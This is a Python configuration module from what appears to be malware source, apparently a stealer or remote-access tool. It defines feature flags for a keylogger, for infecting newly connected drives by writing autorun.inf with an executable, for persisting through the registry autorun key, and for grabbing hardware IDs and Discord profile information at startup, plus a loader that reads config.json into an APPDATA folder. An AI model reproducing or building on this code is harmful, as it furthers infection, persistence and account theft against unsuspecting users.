import sys
import json
import os
from .debug import message as debug_message

# Features.

# Keylogger (Will not launch at the start).
FEATURE_KEYLOGGER_ENABLED: bool = False

# Drives watching (Sends message when user update drive)(Disable drives infection).
FEATURE_DRIVES_WATCHING_ENABLED: bool = True

# Drives injection (Writes autorun.inf with executable when connect new drive).
FEATURE_DRIVES_INJECTION_ENABLED: bool = True

# Registers self to the registry autorun key.
FEATURE_AUTORUN_ENABLED: bool = True

# Grabs HWID at the startup (WARNING: Slow, use `get_hwid` command instead)
FEATURE_STARTUP_HWID_GRABBING_ENABLED: bool = True

# Grabs Discor information at the startup (WARNING: Slow, use `discord_profile` command instead).
FEATURE_STARTUP_DISCORD_GRABBING_ENABLED = True


# Not allowes to register self to the registry when running not ".exe" file.
DISALLOW_NOT_EXECUTABLE_AUTORUN = True


# Config.

def _load_config() -> None:
    """ Loads CONFIG values. """

    global _config
    global _folder

    try:
        with open("config.json", "r", encoding="UTF-8") as config_file:
            _config = json.load(config_file)
    except FileNotFoundError:
        debug_message("[Config] Failed to load CONFIG file as it is not found! "
                      "Please read more wiki...")
        sys.exit(1)
        
    if not _config:
        debug_message("[Config] Failed to load! Is CONFIG file empty?")
        sys.exit(1)

    if "paths" in _config and "main" in _config["paths"]:
        _folder = os.getenv("APPDATA") + _config["paths"]["main"]
    else:
        debug_message("[Config] Failed to load main folder in paths->main! Is CONFIG file invalid?")
        sys.exit(1)


def get_config():
    if _config is None:
        _load_config()
    return _config

def get_folder():
    if _folder is None:
        _load_config()
    return _folder

_folder = None
_config = None